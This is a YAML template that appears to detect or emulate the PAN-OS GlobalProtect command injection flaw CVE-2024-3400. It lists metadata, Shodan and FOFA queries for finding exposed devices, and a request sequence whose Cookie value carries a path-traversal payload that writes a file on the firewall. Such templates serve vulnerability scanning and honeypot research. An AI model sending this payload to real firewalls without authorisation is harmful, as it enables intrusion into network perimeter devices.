id: CVE-2024-3400
info:
  name: GlobalProtect - OS Command Injection
  author: salts,parthmalhotra
  description: 'A command injection vulnerability in the GlobalProtect feature of
    Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature
    configurations may enable an unauthenticated attacker to execute arbitrary code
    with root privileges on the firewall.Cloud NGFW, Panorama appliances, and Prisma
    Access are not impacted by this vulnerability.

    '
  severity: critical
  reference:
  - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
  - https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
  - https://nvd.nist.gov/vuln/detail/CVE-2024-3400
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2024-3400
    cwe-id: CWE-77
    epss-score: 0.00371
    epss-percentile: 0.72356
    cpe: cpe:2.3:o:paloaltonetworks:pan-os:10.2.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-631559155"
    shodan-query: http.favicon.hash:-631559155
    product: pan-os
    vendor: paloaltonetworks
  tags: cve,cve2024,globalprotect,pan-os,rce,oast,kev
traps:
- request:
    method: GET
    path: /global-protect/portal/images/.txt
    headers: {}
    body: ''
  response:
    status_code: 404
    headers: {}
    body: ''
- request:
    method: POST
    path: /ssl-vpn/hipreport.esp
    headers:
      Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/{{randstr}}.txt;
      Content-Type: application/x-www-form-urlencoded
    body: 'user=global&portal=global&authcookie=e51140e4-4ee3-4ced-9373-96160d68&domain=global&computer=global&client-ip=global&client-ipv6=global&md5-sum=global&gwHipReportCheck=global

      '
  response:
    status_code: 200
    headers: {}
    body: invalid required input parameters
- request:
    method: GET
    path: /global-protect/portal/images/.txt
    headers: {}
    body: ''
  response:
    status_code: 403
    headers: {}
    body: ''
